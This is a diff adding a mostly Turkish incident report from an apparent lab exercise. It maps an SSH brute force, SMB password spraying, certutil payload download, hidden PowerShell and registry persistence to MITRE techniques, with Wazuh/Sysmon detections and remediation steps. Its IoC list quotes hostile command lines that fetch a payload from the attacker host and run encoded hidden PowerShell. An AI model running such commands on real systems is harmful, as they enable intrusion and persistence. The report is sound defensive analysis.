@@ -1,0 +1,60 @@
+**INCIDENT INVESTIGATION REPORT: MULTI-STAGE INTRUSION & PERSISTENCE**
+
+* **Incident Identifier:** INC-20260917-01
+* **Severity Level:** High / Critical (Rule Level 12)
+* **Status:** Contained / Closed
+* **Lead Investigator:** Utkan Keser (SOC Analyst / Blue Team)
+
+---
+
+**1. Executive Summary**
+
+Laboratuvar ağında harici bir saldırgan makinenin (`192.168.56.101`) Linux sunucusuna yönelik kimlik denemeleri gerçekleştirdiği, ardından Windows uç noktasına yönelerek `certutil.exe` LOLBin aracı üzerinden uzaktan zararlı indirme (Ingress Tool Transfer - T1105) teşebbüsünde bulunduğu tespit edilmiştir. Eşzamanlı olarak şüpheli gizli PowerShell (T1059.001) oturumları açılmış ve sistemde kalıcılık sağlamak adına Windows Registry / Task Scheduler manipülasyonu denenmiştir. Olay Wazuh SIEM ve Sysmon telemetrisi üzerinden gerçek zamanlı olarak izole edilmiş ve doğrulanmıştır.
+
+---
+
+**2. Attack Timeline**
+
+| Zaman (UTC) | Etkilenen Varlık | Kaynak IP | Olay / Tespit Edilen Davranış | MITRE ATT&CK | Kural / Seviye |
+| --- | --- | --- | --- | --- | --- |
+| **T0 (05:08)** | `Ubuntu-Server` | `192.168.56.101` | SSH Brute Force (Hydra parola tahmin denemeleri) | T1110 (Brute Force) | Rule 2502 / Lvl 10 |
+| **T1 (05:15)** | `Windows-Victim` | `192.168.56.101` | SMB Port 445 Kimlik Denemesi (LogonType 3, Failure 0xC000006A) | T1110.003 (Password Spraying) | Event 4625 / Lvl 5 |
+| **T2 (05:42)** | `Windows-Victim` | `192.168.56.101` | Certutil ile uzaktan ikili dosya indirme girişimi (`-urlcache -split -f`) | T1105 (Ingress Tool Transfer) | Rule 92041 / **Lvl 12** |
+| **T3 (05:46)** | `Windows-Victim` | Localhost | Base64 ile encode edilmiş gizli PowerShell oturumu başlatılması | T1059.001 (PowerShell) / T1027 | Rule 92033 / **Lvl 12** |
+| **T4 (05:47)** | `Windows-Victim` | Localhost | Registry Run Key (`UpdaterService`) ve Zamanlanmış Görev (`schtasks`) | T1547.001 / T1053.005 | Rule 92041 / Lvl 5+ |
+
+---
+
+**3. Indicators of Compromise (IoC Listesi)**
+
+* **Network IoCs:**
+* Attacker C2 / Scanning IP: `192.168.56.101`
+* Targeted Ports: `22/tcp` (SSH), `445/tcp` (SMB), `8000/tcp` (HTTP Listener)
+
+
+* **Host / Endpoint IoCs:**
+* Staged File Paths: `C:\Windows\Temp\beacon.exe`, `C:\Windows\Temp\malware.exe`
+* Persistence Registry Key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterService`
+* Scheduled Task Name: `SecurityHealthUpdater`, `AppHealthCheck`
+* Malicious Command Lines:
+* `certutil -urlcache -split -f [http://192.168.56.101/payload.exe](http://192.168.56.101/payload.exe) ...`
+* `powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <BASE64>`
+
+---
+
+**4. Root Cause & Detection Efficacy**
+
+* **Savunma Başarısı:** Windows Defender Güvenlik Duvarı varsayılan kapalı port taramalarını (SYN Scan) başarıyla drop etmiş, yetkisiz TCP bağlantılarını engellemiştir.
+* **Telemetri Görünürlüğü:** Sysmon Event ID 1 (Process Creation) ve Event ID 3 (Network Connection) sayesinde, saldırgan gizleme teknikleri (Base64 obfuscation) kullansa dahi Parent-Child ilişkisi (`powershell.exe` $\rightarrow$ `reg.exe` / `certutil.exe`) üzerinden saldırı anında Seviye 12 olarak alarm üretmiştir.
+* **Linux Görünürlüğü:** Wazuh correlation engine (`Rule 2502`), tekil PAM başarısızlıklarını birleştirerek SSH kaba kuvvet saldırısını otomatik sınıflandırmıştır.
+
+---
+
+**5. Containment & Remediation**
+
+1. `192.168.56.101` kaynaklı tüm gelen trafik ağ seviyesinde ve host tabanlı güvenlik duvarlarında (ufw / Windows Firewall) engellenmeli.
+2. `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterService` anahtarı silinmeli.
+3. `C:\Windows\Temp\` altındaki yetkisiz `.exe` kalıntıları temizlenmeli.
+4. Çevre sistemlerde SSH için parola tabanlı giriş kapatılmalı, anahtar tabanlı kimlik doğrulama (Ed25519) zorunlu tutulmalı.
+5. Windows ortamında `certutil.exe` gibi LOLBin araçlarının komut satırından internete çıkışı AppLocker / Attack Surface Reduction (ASR) kuralları ile sınırlandırılmalı.
+
